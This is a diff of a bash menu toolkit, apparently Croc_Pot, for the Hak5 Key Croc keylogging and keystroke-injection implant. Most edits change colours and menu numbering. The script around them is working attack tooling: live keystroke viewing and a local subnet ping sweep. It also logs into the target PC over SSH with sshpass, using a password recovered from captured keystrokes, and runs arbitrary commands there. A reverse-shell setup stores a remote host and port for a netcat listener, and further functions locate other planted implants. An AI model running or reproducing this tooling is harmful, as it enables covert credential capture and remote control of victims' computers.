+MenuColor 20 6 PING TARGET SCAN ; MenuColor 20 7 TARGET PORT SCAN ; MenuColor 20 8 SSL/TLS SSLSCAN ; MenuColor 20 9 PHONE NUMBER LOOKUP ; MenuColor 19 10 DNS LEAK TEST
+MenuColor 19 11 E-MAIL LEAK TEST ; MenuColor 19 12 PENTMENU RECON ; MenuColor 18 13 RETURN TO MAIN MENU ; MenuEnd 23
 	case $m_a in
 	1) tcpdump_scan ; croc_recon ;; 2) nmap_menu ; croc_recon ;; 3) traceroute_scan ; croc_recon ;; 4) whois_scan ; croc_recon ;; 5) dns_scan ; croc_recon ;; 6) target_ping ; croc_recon ;;
-	7) target_port ; croc_recon ;; 8) ssl_scan ; croc_recon ;; 9) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; croc_recon ;;
+	7) target_port ; croc_recon ;; 8) ssl_scan ; croc_recon ;; 9) phone_lookup ; croc_recon ;; 10) leak_dns ; croc_recon ;;
+	11) email_leak ; croc_recon ;; 12) pentmenu ; pentmenu ;; 13) main_menu ;; 0) exit 0 ;; [bB]) menu_B ;; *) invalid_entry ; croc_recon ;;
 	esac
 }
 ##
@@ -3754,9 +4951,9 @@ if [ -e "${PAYLOAD_FOLDER}" ]; then
 	echo -ne "\n${LINE_}\e[5m$(ColorRed 'THIS PAYLOAD ALREADY EXISTS PLEASE CHOOSE A DIFFERENT NAME')${LINE_}\n"
 else
 	touch ${PAYLOAD_FOLDER}
-	echo -ne "$(ColorBlue 'ENTER THE MATCH WORD YOU WOULD LIKE TO USE AND PRESS [ENTER]:')"; read USER_MATCH
-	echo -ne "$(ColorBlue 'ENTER THE SSID AND PRESS [ENTER]:')"; read USER_SSID
-	echo -ne "$(ColorBlue 'ENTER THE PASSWORD AND PRESS [ENTER]:')"; read WIFI_PASS
+	echo -ne "\e[38;5;19;1;48;5;245mENTER THE MATCH WORD YOU WOULD LIKE TO USE AND PRESS [ENTER]:${clear}"; read USER_MATCH
+	echo -ne "\e[38;5;19;1;48;5;245mENTER THE SSID AND PRESS [ENTER]:${clear}"; read USER_SSID
+	echo -ne "\e[38;5;19;1;48;5;245mENTER THE PASSWORD AND PRESS [ENTER]:${clear}"; read WIFI_PASS
 	echo -ne "# Title:         WIFI-SETUP\n# Description:   Setup your wifi with adding your ssid and passwd\n# Author:        spywill\n# Version:       1.3\n# Category:      Key Croc\n#\n#\n
 MATCH ${USER_MATCH}\nLED SETUP\n\$(sed -i -E -e '/^[WS]/d' -e '9 a WIFI_SSID ${USER_SSID}\\\nWIFI_PASS ${WIFI_PASS}\\\nSSH ENABLE' /root/udisk/config.txt)\nsleep 1\nLED FINISH" >> ${PAYLOAD_FOLDER}
 	echo -ne "\n${red}***${clear}$(ColorGreen 'WIFI_SET PAYLOAD IS NOW INSTALLED CHECK KEYCROC PAYLOADS FOLDER')${red}***${clear}\n
@@ -4344,7 +5541,7 @@ processes_check() {
 	ps -aux ; echo ${LINE} ; service --status-all ; echo ${LINE} ; findmnt -A ; echo ${LINE} ; usb-devices
 }
 ##
-#----Status KeyCroc info
+#----Status check all KeyCroc info
 ##
 all_checks() {
 	clear
@@ -4446,7 +5643,7 @@ fi
 	if [ -e "/root/udisk/payloads/${r_a}" ]; then
 		R_M=$(cat /root/udisk/payloads/${r_a} | grep MATCH | awk {'print $2'})
 		echo -ne "$(ColorYellow 'Current Match word is ')${green}${R_M}${clear}\n"
-		echo -ne "${blue}ENTER NEW MATCH WORD AND PRESS [ENTER]:${clear}"; read m_w
+		echo -ne "\e[38;5;19;1;48;5;245mENTER NEW MATCH WORD AND PRESS [ENTER]:${clear}"; read m_w
 		sed -i "/MATCH$/!{s/$R_M/$m_w/}" /root/udisk/payloads/${r_a}
 		grep MATCH* --color=always /root/udisk/payloads/${r_a}
 	else
@@ -4459,15 +5656,31 @@ fi
 	esac
 }
 ##
+#----Croc Status check local weather
+##
+check_weather() {
+	Q ALT-SPACE
+	Q STRING "x"
+	curl wttr.in
+	sleep 5
+	curl wttr.in/moon
+	sleep 5
+#	Q ALT-SPACE
+#	sleep 1
+#	Q STRING "e"
+#	sleep 1
+	menu_A
+}
+##
 #----Croc Status Menu
 ##
 menu_A() {
 	LED B
 MenuTitle KEYCROC STATUS MENU ; MenuColor 27 1 MEMORY USAGE ; MenuColor 27 2 CPU LOAD ; MenuColor 27 3 NETWORK-CONNECTIONS ; MenuColor 27 4 KERNEL VERSION ; MenuColor 27 5 RUNNING PROCESSES
-MenuColor 27 6 CHECK ALL ; MenuColor 27 7 TARGET PC INFO ; MenuColor 27 8 VIEW LIVE KEYSTORKES ; MenuColor 27 9 START NMON MONITORING ; MenuColor 26 10 LIST MATCH PAYLOADS WORDS ; MenuColor 26 11 RETURN TO MAIN MENU ; MenuEnd 30
+MenuColor 27 6 CHECK ALL ; MenuColor 27 7 TARGET PC INFO ; MenuColor 27 8 VIEW LIVE KEYSTORKES ; MenuColor 27 9 START NMON MONITORING ; MenuColor 26 10 LIST MATCH PAYLOADS WORDS ; MenuColor 26 11 CHECK LOCAL WEATHER ; MenuColor 26 12 RETURN TO MAIN MENU ; MenuEnd 30
 	case $m_a in
 	1) memory_check ; menu_A ;; 2) cpu_check ; menu_A ;; 3) tcp_check ; menu_A ;; 4) kernel_check ; menu_A ;; 5) processes_check ; menu_A ;; 6) all_checks ; menu_A ;;
-	7) pc_info ; menu_A ;; 8) keystorkes_V ; menu_A ;; 9) nmon_system ; menu_A ;; 10) list_match ; menu_A ;; 11) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; menu_A ;;
+	7) pc_info ; menu_A ;; 8) keystorkes_V ; menu_A ;; 9) nmon_system ; menu_A ;; 10) list_match ; menu_A ;; 11) check_weather ;; 12) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; menu_A ;;
 	esac
  }
 menu_A
@@ -4686,10 +5899,10 @@ if [[ $? -ne 0 ]]; then
 	if [[ $? -ne 0 ]]; then
 		sleep 0.1
 	elif [[ "${#args[@]}" -eq 0 ]]; then
-		echo -ne "\e[4m${blue}${@:2}${clear}${yellow}:${clear}${green}ONLINE${clear}${yellow} IP:${clear}${green}$(ping -q -c 1 -w 1 ${DEFAULT_IP} | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')${clear}" ; get_mac ${1} ; port_check ${1}
+		echo -ne "\e[38;5;19;4;1;48;5;245m${@:2}${clear}${yellow}:${clear}${green}ONLINE${clear}${yellow} IP:${clear}${green}$(ping -q -c 1 -w 1 ${DEFAULT_IP} | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')${clear}" ; get_mac ${1} ; port_check ${1}
 	fi
 elif [[ "${#args[@]}" -eq 0 ]]; then
-		echo -ne "\e[4m${blue}${@:2}${clear}${yellow}:${clear}${green}ONLINE${clear}${yellow} IP:${clear}${green}$(ping -q -c 1 -w 1 ${1} | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')${clear}" ; get_mac ${1} ; port_check ${1}
+		echo -ne "\e[38;5;19;4;1;48;5;245m${@:2}${clear}${yellow}:${clear}${green}ONLINE${clear}${yellow} IP:${clear}${green}$(ping -q -c 1 -w 1 ${1} | sed -nE 's/^PING[^(]+\(([^)]+)\).*/\1/p')${clear}" ; get_mac ${1} ; port_check ${1}
 fi 2> /dev/null
 }
 ##
@@ -4705,10 +5918,23 @@ default_ip() {
 shark_check() {
 	local SHARK_IP=/root/udisk/tools/Croc_Pot/shark_ip.txt
 if [ -e ${SHARK_IP} ]; then
-	if [ "$(sed -n '1p' ${SHARK_IP})" != "" ]; then
+	if [[ "$(sed -n '1p' ${SHARK_IP})" =~ ${validate_ip} ]]; then
 	default_ip $(sed -n '1p' ${SHARK_IP})
 else
 	default_ip 172.16.24.1
+	fi
+fi 2> /dev/null
+}
+##
+#----SSH LAN TURTLE get ip from Croc_Pot_Payload
+##
+turtle_check() {
+	local TURTLE_IP=/root/udisk/tools/Croc_Pot/turtle_mac.txt
+if [ -e ${TURTLE_IP} ]; then
+	if [[ "$(sed -n '1p' ${TURTLE_IP})" =~ ${validate_ip} ]]; then
+	default_ip $(sed -n '1p' ${TURTLE_IP})
+else
+	default_ip 172.16.84.1
 	fi
 fi 2> /dev/null
 }
@@ -4755,6 +5981,14 @@ if [ -e "${1}" ]; then
 fi 2> /dev/null
 }
 ##
+#----SSH check for saved mac address for windows
+##
+saved_mac_win() {
+if [ -e "${1}" ]; then
+	save_mac=$(cat /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt | grep -iPo \^\.*[[:xdigit:]][[:xdigit:]]:[[:xdigit:]]\.\*\$ | sed -n '/[[:xdigit:]]::/!p' | sed -n '/[[:xdigit:]][[:xdigit:]][[:xdigit:]]:/!p' | cut -d " " -f1 | awk 'FNR <= 1' | sed -e 's/\(.*\)/\L\1/')
+fi
+}
+##
 #----SSH check for saved bash bunny mac address
 ##
 bunny_mac() {
@@ -4766,7 +6000,7 @@ elif [ "$(OS_CHECK)" = LINUX ]; then
 fi 2> /dev/null
 if [[ "$(sed -n 1p /root/udisk/tools/Croc_Pot/bunny_mac.txt)" =~ ^([[:xdigit:]][[:xdigit:]]:){5}[[:xdigit:]][[:xdigit:]]$ ]]; then
 	local bunny_s=$(sed -n 10p /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell/payload.txt | sed -e 's/ssh -fN -R \(.*\):localhost:22/\1/' | sed '1{s/[^ ]\+\s*$//}')
-	echo -ne "\e[4m${blue}BASH BUNNY${clear}${yellow}:${clear}${green}TUNNEL${clear} ${yellow}IP:${clear}${green}172.16.64.1${clear}${yellow} MAC:${clear}${green}${bunny_v}${clear}${yellow} Port:${clear}${green}${bunny_s}${clear}\n"
+	echo -ne "\e[38;5;19;4;1;48;5;245mBASH BUNNY${clear}${yellow}:${clear}${green}TUNNEL${clear} ${yellow}IP:${clear}${green}172.16.64.1${clear}${yellow} MAC:${clear}${green}${bunny_v}${clear}${yellow} Port:${clear}${green}${bunny_s}${clear}\n"
 else
 	sleep 0.1
 fi 2> /dev/null
@@ -4784,7 +6018,31 @@ ssid_check() {
 	local ss_id=$(iw dev wlan0 scan | egrep "signal:|SSID:" | sed -e "s/\tsignal: //" -e "s/\tSSID: //" | awk '{ORS = (NR % 2 == 0)? "\n" : " "; print}' | sed -n '/'$(sed -n -e 's/^WIFI_SSID //p' /root/udisk/config.txt)'/p')
 	local gateway=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " ")
 	local mask=$(/sbin/ifconfig wlan0 | awk '/Mask:/{ print $4;}' | sed 's/Mask:/'\\${yellow}NetMask:\\${clear}\\${green}'/g')
-	echo -ne "\e[4m${blue}SSID     ${clear}${yellow}:${clear}${green}${ss_id}${clear}${yellow} GATEWAY IP:${clear}${green}${gateway} ${clear}${mask}${clear}\n"
+	echo -ne "\e[38;5;19;4;1;48;5;245mSSID     ${clear}${yellow}:${clear}${green}${ss_id}${clear}${yellow} GATEWAY IP:${clear}${green}${gateway} ${clear}${mask}${clear}\n"
+}
+##
+#----SSH check if screen crab connected to network
+##
+screen_crab() {
+	local t_ip=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " " | sed -r 's/.{1}$//')
+	for crab in {1..254} ;do (ping -q -c 1 -w 1 $t_ip$crab >/dev/null &) ;done
+	local crab_host=$(arp -a | sed -n 's/\(android-[0-9]*\+.\+lan\)/\1/p' | awk '{print $1}')
+	local crab_ip=$(arp -a | sed -n 's/\(android-[0-9]*\+.\+lan\)/\1/p' | awk '{print $2}' | sed 's/[(),]//g')
+	if [[ "${crab_ip}" =~ ${validate_ip} ]]; then
+	check_device ${crab_ip} SCREEN CRAB
+	fi
+}
+##
+#----SSH check signal owl connected to network
+##
+owl_check() {
+	local OWL_MAC=00:00:00:00:00:00          #place Owl mac here
+	local OWL_IP=$(arp -a | sed -ne '/'${OWL_MAC}'/p' | sed -e 's/.*(\(.*\)).*/\1/')
+if [[ "${OWL_IP}" =~ ${validate_ip} ]]; then
+	IP_O=${OWL_IP}
+else
+	IP_O=172.16.56.1
+fi
 }
 ##
 #----SSH display info screen
@@ -4794,20 +6052,19 @@ ssid_check() {
 -Reverse ssh tunnel, Create SSH Public/Private Key
 -Ensure devices are connected to the same local network As keycroc')\n"
 local croc_mac=$(cat /sys/class/net/$(ip route show default | awk '/default/ {print $5}')/address)
-local croc_city=$(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=city) #| sed -n 's/\("city"\)/\1/p' | sed 's/"city"://g' | sed 's/"//g' | sed 's/,//g' | sed 's/^[[:space:]]*//' ; echo $1)
-local croc_country=$(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=country) #| sed -n 's/\("country":\)/\1/p' | sed 's/"country"://g' | sed 's/"//g' | sed 's/,//g' | sed 's/^[[:space:]]*//' ; echo $1)
+local croc_city=$(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=city)
+local croc_country=$(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=country)
 local croc_region=$(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=region)
 local croc_isp=$(curl -Lsf --connect-timeout 2 --max-time 2 http://ip-api.com/line?fields=isp)
 check_device $(os_ip) TARGET PC
-echo -ne "\e[4m${blue}Public ip${clear}${yellow}:${clear}${green}$(curl -s --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com) ${clear}${yellow}COUNTRY:${clear}${green}${croc_country} ${clear}${yellow}CITY:${clear}${green}${croc_city}${clear}${yellow}/${clear}${green}${croc_region} ${clear}${yellow}ISP:${clear}${green}${croc_isp}${clear}\n"
-ssid_check
-check_device croc KEY CROC_ | sed 's/--/'$croc_mac'/g'
+echo -ne "\e[38;5;19;4;1;48;5;245mPublic ip${clear}${yellow}:${clear}${green}$(curl -s --connect-timeout 2 --max-time 2 https://checkip.amazonaws.com) ${clear}${yellow}COUNTRY:${clear}${green}${croc_country} ${clear}${yellow}CITY:${clear}${green}${croc_city}${clear}${yellow}/${clear}${green}${croc_region} ${clear}${yellow}ISP:${clear}${green}${croc_isp}${clear}\n"
+ssid_check ; check_device croc KEY CROC_ | sed 's/--/'$croc_mac'/g'
 default_ip 172.16.42.1 ; check_device mk7 WIFI PINEAPPLE_
 saved_mac /root/udisk/tools/Croc_Pot/squirrel_mac.txt 1p ; default_ip 172.16.32.1 ; check_device squirrel PACKET SQUIRREL
-sed -i 's/--//g' /root/udisk/tools/Croc_Pot/turtle_mac.txt 2> /dev/null ; saved_mac /root/udisk/tools/Croc_Pot/turtle_mac.txt 1p ; default_ip 172.16.84.1 ; check_device turtle LAN TURTLE
-saved_mac /root/udisk/tools/Croc_Pot/shark_ip.txt 2p ; shark_check ; check_device shark SHARK JACK
-bunny_mac
-check_device ${remote_vps} REMOTE VPS | sed 's/MAC://g' | sed 's/--//g'
+sed -i 's/--//g' /root/udisk/tools/Croc_Pot/turtle_mac.txt 2> /dev/null ; saved_mac /root/udisk/tools/Croc_Pot/turtle_mac.txt 2p ; turtle_check ; check_device turtle LAN TURTLE_
+saved_mac /root/udisk/tools/Croc_Pot/shark_ip.txt 2p ; shark_check ; check_device shark SHARK JACK_
+#screen_crab ; owl_check ; check_device ${IP_O} SIGNAL OWL_
+bunny_mac ; check_device ${remote_vps} REMOTE VPS_ | sed 's/MAC://g' | sed 's/--//g'
 echo -ne "\e[48;5;202;30m${LINE}${clear}\n"
 ##
 #----SSH keycroc to target pc
@@ -4845,14 +6102,15 @@ fi
 ##
 reachable_target() {
 	local t_ip=$(route -n | grep "UG" | grep -v "UGH" | cut -f 10 -d " " | sed -r 's/.{1}$//')
-	for i in {1..254} ;do (ping -q -c 1 -w 1 $t_ip$i >/dev/null && echo "$t_ip$i" &) ;done | ip n | grep -i reach | sed -r 's/\b(dev|lladdr)\b//g'
+	for i in {1..254} ;do (ping -q -c 1 -w 1 $t_ip$i >/dev/null && echo "$t_ip$i" &) ;done
+	ip n | grep -i reach | sed -r 's/\b(dev|lladdr)\b//g'
 }
 ##
 #----SSH enter user/ip to start ssh
 ##
 userinput_ssh() {
-	echo -ne "$(ColorBlue 'ENTER THE HOST/USER NAME FOR SSH AND PRESS [ENTER]:')"; read SSH_USER
-	echo -ne "$(ColorBlue 'ENTER THE IP FOR SSH AND PRESS [ENTER]:')"; read SSH_IP
+	echo -ne "\e[38;5;19;1;48;5;245mENTER THE HOST/USER NAME FOR SSH AND PRESS [ENTER]:${clear}"; read SSH_USER
+	echo -ne "\e[38;5;19;1;48;5;245mENTER THE IP FOR SSH AND PRESS [ENTER]:${clear}"; read SSH_IP
 	ssh -o "StrictHostKeyChecking no" ${SSH_USER}@${SSH_IP}
 }
 ##
@@ -4875,7 +6133,20 @@ ssh_squirrel() {
 #----SSH to lan turtle
 ##
 ssh_turtle() {
-	ip_check_ssh turtle 172.16.84.1
+	local TURTLE_IP=/root/udisk/tools/Croc_Pot/turtle_mac.txt
+if [ -e ${TURTLE_IP} ]; then
+	if [[ "$(sed -n '1p' ${TURTLE_IP})" =~ ${validate_ip} ]]; then
+		ip_check_ssh $(sed -n '1p' ${TURTLE_IP}) turtle
+else
+		ip_check_ssh turtle 172.16.84.1
+	fi
+fi 2> /dev/null
+}
+##
+#----SSH to signal owl
+##
+ssh_owl() {
+	ip_check_ssh ${IP_O} 172.16.56.1
 }
 ##
 #----SSH to shark jack
@@ -5152,9 +6423,9 @@ croc_reverse_shell() {
 shell_input() {
 	unset IP_RS IP_RSP IP_RSN
 	rm /root/udisk/tools/Croc_Pot/saved_shell.txt 2> /dev/null
-	echo -ne "$(ColorBlue 'ENTER IP OF SERVER/REMOTE-HOST PRESS [ENTER]:')"; read IP_RS ; echo "${IP_RS}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
-	echo -ne "$(ColorBlue 'ENTER PORT NUMBER TO USE PRESS [ENTER]:')"; read IP_RSP ; echo "${IP_RSP}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
-	echo -ne "$(ColorBlue 'ENTER SERVER/REMOTE-HOST NAME PRESS [ENTER]:')"; read IP_RSN ; echo "${IP_RSN}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
+	echo -ne "\e[38;5;19;1;48;5;245mENTER IP OF SERVER/REMOTE-HOST PRESS [ENTER]:${clear}"; read IP_RS ; echo "${IP_RS}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
+	echo -ne "\e[38;5;19;1;48;5;245mENTER PORT NUMBER TO USE PRESS [ENTER]:${clear}"; read IP_RSP ; echo "${IP_RSP}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
+	echo -ne "\e[38;5;19;1;48;5;245mENTER SERVER/REMOTE-HOST NAME PRESS [ENTER]:${clear}"; read IP_RSN ; echo "${IP_RSN}" >> /root/udisk/tools/Croc_Pot/saved_shell.txt
 }
 ##
 #----SSH reverse with netcat remote listener on (server)
@@ -5426,19 +6697,19 @@ remote_command() {
 -ssh USER@HOST COMMAND1 | COMMAND2 | COMMAND3
 -SSH between remote hosts and get back the output')\n\n"
 target_command() {
-	echo -ne "$(ColorBlue 'ENTER COMMAND AND PRESS [ENTER]:')"; read USER_COMMAND
+	echo -ne "\e[38;5;19;1;48;5;245mENTER COMMAND AND PRESS [ENTER]:${clear}"; read USER_COMMAND
 	ssh ${1}@${@:2} ${USER_COMMAND}
 	sleep 5
 }
 input_command() {
-	echo -ne "$(ColorBlue 'ENTER TARGET USRNAME AND PRESS [ENTER]:')"; read USERNAME_COMMAND
-	echo -ne "$(ColorBlue 'ENTER TARGET IP AND PRESS [ENTER]:')"; read IP_COMMAND
-	echo -ne "$(ColorBlue 'ENTER COMMAND AND PRESS [ENTER]:')"; read USER_COMMAND
+	echo -ne "\e[38;5;19;1;48;5;245mENTER TARGET USRNAME AND PRESS [ENTER]:${clear}"; read USERNAME_COMMAND
+	echo -ne "\e[38;5;19;1;48;5;245mENTER TARGET IP AND PRESS [ENTER]:${clear}"; read IP_COMMAND
+	echo -ne "\e[38;5;19;1;48;5;245mENTER COMMAND AND PRESS [ENTER]:${clear}"; read USER_COMMAND
 	ssh ${USERNAME_COMMAND}@${IP_COMMAND} ${USER_COMMAND}
 	sleep 5
 }
 pc_target_command() {
-	echo -ne "$(ColorBlue 'ENTER COMMAND AND PRESS [ENTER]:')"; read USER_COMMAND
+	echo -ne "\e[38;5;19;1;48;5;245mENTER COMMAND AND PRESS [ENTER]:${clear}"; read USER_COMMAND
 if [ -e "/root/udisk/tools/Croc_Pot/Croc_unlock.txt.filtered" ]; then
 	sshpass -p $(target_pw) ssh -o "StrictHostKeyChecking no" $(sed -n 1p /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt)@$(os_ip) ${USER_COMMAND}
 	sleep 5
@@ -5489,12 +6760,18 @@ esac
 #----SSH Menu
 ## 
 	LED B
-MenuTitle CROC POT SSH MENU ; echo -ne "\t\t" ; MenuColor 18 1 SSH TARGET PC | tr -d '\t\n' ; MenuColor 19 7 LAN TURTLE | tr -d '\t' ; echo -ne "\t\t" ; MenuColor 18 2 SSH USER INPUT | tr -d '\t\n' ; MenuColor 19 8 SHARK JACK | tr -d '\t' ; echo -ne "\t\t" ; MenuColor 18 3 ENABLE_SSH | tr -d '\t\n' ; MenuColor 19 9 BASH BUNNY | tr -d '\t'
-echo -ne "\t\t" ; MenuColor 18 4 DISABLE_SSH | tr -d '\t\n' ; MenuColor 18 10 REVERSE SHELL | tr -d '\t' ; echo -ne "\t\t" ; MenuColor 18 5 WIFI PINEAPPLE | tr -d '\t\n' ; MenuColor 18 11 PUBLIC/PRIVATE KEY | tr -d '\t' ; echo -ne "\t\t" ; MenuColor 18 6 PACKET SQUIRREL | tr -d '\t\n' ; MenuColor 18 12 REMOVE SSH_KEYGEN | tr -d '\t' ; MenuColor 18 13 RETURN TO MAIN MENU
+MenuTitle CROC POT SSH MENU
+echo -ne "\t\t" ; MenuColor 18 1 SSH TARGET PC | tr -d '\t\n' ; MenuColor 20 8 SIGNAL OWL | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 18 2 SSH USER INPUT | tr -d '\t\n' ; MenuColor 20 9 SHARK JACK | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 18 3 ENABLE_SSH | tr -d '\t\n' ; MenuColor 19 10 BASH BUNNY | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 18 4 DISABLE_SSH | tr -d '\t\n' ; MenuColor 19 11 REVERSE SHELL | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 18 5 WIFI PINEAPPLE | tr -d '\t\n' ; MenuColor 19 12 PUBLIC/PRIVATE KEY | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 18 6 PACKET SQUIRREL | tr -d '\t\n' ; MenuColor 19 13 REMOVE SSH_KEYGEN | tr -d '\t'
+echo -ne "\t\t" ; MenuColor 18 7 LAN TURTLE | tr -d '\t\n' ; MenuColor 18 14 RETURN TO MAIN MENU | tr -d '\t'
 MenuEnd 23
 	case $m_a in
 	1) pc_ssh ; ssh_menu ;; 2) echo -ne "${yellow}Reachable target on local network:${clear}\n" ; reachable_target ; userinput_ssh ; ssh_menu ;; 3) ENABLE_SSH ; ssh_menu ;; 4) DISABLE_SSH ; ssh_menu ;; 5) ssh_pineapple ; ssh_menu ;; 6) ssh_squirrel ; ssh_menu ;; 7) ssh_turtle ; ssh_menu ;;
-	8) ssh_shark ; ssh_menu ;; 9) ssh_bunny ; ssh_menu ;; 10) croc_reverse_shell ; ssh_menu ;; 11) ssh_keygen ; ssh_menu ;; 12) remove_sshkey ; ssh_menu ;; 13) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; ssh_menu ;;
+	8) ssh_owl ; ssh_menu ;; 9) ssh_shark ; ssh_menu ;; 10) ssh_bunny ; ssh_menu ;; 11) croc_reverse_shell ; ssh_menu ;; 12) ssh_keygen ; ssh_menu ;; 13) remove_sshkey ; ssh_menu ;; 14) main_menu ;; 0) exit 0 ;; [bB]) main_menu ;; *) invalid_entry ; ssh_menu ;;
 	esac
 }
 ##
@@ -5593,11 +6870,11 @@ remove_croc_pot() {
 	echo -ne "$(ColorRed 'ARE YOU SURE TO REMOVE CROC_POT TYPE YES OR NO AND PRESS [ENTER]:')"; read CROC_POT_REMOVE
 case $CROC_POT_REMOVE in
 [yY] | [yY][eE][sS])
-	apt -y remove unzip openvpn mc nmon sshpass screenfetch whois dnsutils sslscan speedtest-cli
+	apt -y remove unzip openvpn mc nmon sshpass screenfetch whois dnsutils sslscan speedtest-cli host hping3 stunnel ike-scan
 	rm -r /var/hak5c2 /root/udisk/loot/Croc_Pot /root/udisk/tools/Croc_Pot/Bunny_Payload_Shell /root/udisk/tools/Croc_Pot
 	rm /usr/local/bin/c2-3.1.2_armv7_linux /etc/systemd/system/hak5.service /root/udisk/payloads/Getonline_Linux.txt
 	rm /root/udisk/tools/kc_fw_1.3_510.tar.gz /root/udisk/payloads/Croc_Pot_Payload.txt /root/udisk/payloads/Croc_Bite.txt.txt
-	rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt
+	rm /root/udisk/payloads/Croc_unlock_1.txt /root/udisk/payloads/Croc_unlock_2.txt /root/udisk/payloads/No_Sleeping.txt
 	rm /root/udisk/payloads/Getonline_Raspberry.txt /root/udisk/payloads/Quick_Start_C2.txt
 	rm /root/udisk/payloads/Quick_start_Croc_Pot.txt /root/udisk/payloads/Getonline_Windows.txt
 	rm /root/udisk/tools/Croc_Pot/Croc_OS.txt /root/udisk/tools/Croc_Pot/Croc_OS_Target.txt
@@ -5910,9 +7187,9 @@ edit_ip() {
 	read_all CHANGE KEYCROC IP Y/N AND PRESS [ENTER]
 case $r_a in
 [yY] | [yY][eE][sS])
-	echo -ne "$(ColorBlue 'ENTER IP TO BE USED AND PRESS [ENTER] ')"; read ip_e
-	echo -ne "$(ColorBlue 'ENTER NETMASK TO BE USED AND PRESS [ENTER] ')"; read mask_e
-	echo -ne "$(ColorBlue 'ENTER GATEWAY TO BE USED AND PRESS [ENTER] ')"; read gate_e
+	echo -ne "\e[38;5;19;1;48;5;245mENTER IP TO BE USED AND PRESS [ENTER]:${clear}"; read ip_e
+	echo -ne "\e[38;5;19;1;48;5;245mENTER NETMASK TO BE USED AND PRESS [ENTER]:${clear}"; read mask_e
+	echo -ne "\e[38;5;19;1;48;5;245mENTER GATEWAY TO BE USED AND PRESS [ENTER]:${clear}"; read gate_e
 	ifconfig wlan0 ${ip_e} netmask ${mask_e}; route add default gw ${gate_e} wlan0; ;;
 [nN] | [nN][oO])
 	echo -ne "\n$(ColorYellow 'KEEPING EXISTING SETUP')\n" ;;
@@ -5945,9 +7222,9 @@ function main_menu() {
 	LED B
 	clear
 	croc_title
-MenuTitle CROC POT MAIN MENU ; MenuColor 16 1 CROC MAIL | tr -d '\n' ; echo -ne "${blue}${array[4]}${clear}\n" ; MenuColor 16 2 CROC POT PLUS | tr -d '\n' ; echo -ne "${red}${array[5]}${clear}\n"
-MenuColor 16 3 KEYCROC STATUS | tr -d '\n' ; echo -ne "${green}${array[6]}${clear}\n" ; MenuColor 16 4 KEYCROC LOGS | tr -d '\n' ; echo -ne "${white}${array[7]}${clear}\n" ; MenuColor 16 5 KEYCROC EDIT | tr -d '\n' ; echo -ne "${yellow}${array[8]}${clear}\n"
-MenuColor 16 6 SSH MENU | tr -d '\n' ; echo -ne "${blue}${array[9]}${clear}\n" ; MenuColor 16 7 RECOVERY MENU | tr -d '\n' ; echo -ne "${green}${array[10]}${clear}\n" ; MenuColor 16 8 HAK5 CLOUD C2 | tr -d '\n' ; echo -ne "${white}${array[11]}${clear}\n"
+MenuTitle CROC POT MAIN MENU ; MenuColor 16 1 CROC MAIL | tr -d '\n' ; echo -ne "${blue}${array[4]} ${clear}\n" ; MenuColor 16 2 CROC POT PLUS | tr -d '\n' ; echo -ne "${red}${array[5]} ${clear}\n"
+MenuColor 16 3 KEYCROC STATUS | tr -d '\n' ; echo -ne "${green}${array[6]} ${clear}\n" ; MenuColor 16 4 KEYCROC LOGS | tr -d '\n' ; echo -ne "${white}${array[7]} ${clear}\n" ; MenuColor 16 5 KEYCROC EDIT | tr -d '\n' ; echo -ne "${yellow}${array[8]} ${clear}\n"
+MenuColor 16 6 SSH MENU | tr -d '\n' ; echo -ne "${blue}${array[9]} ${clear}\n" ; MenuColor 16 7 RECOVERY MENU | tr -d '\n' ; echo -ne "${green}${array[10]} ${clear}\n" ; MenuColor 16 8 HAK5 CLOUD C2 | tr -d '\n' ; echo -ne "${white}${array[11]} ${clear}\n"
 MenuEnd 20
 	case $m_a in
 	1) croc_mail ;; 2) croc_pot_plus ;; 3) croc_status ;; 4) croc_logs_mean ;; 5) croc_edit_menu ;; 6) ssh_menu ;; 7) croc_recovery ;; 8) hak_cloud ;; 0) exit 0 ;; *) invalid_entry ; main_menu ;;
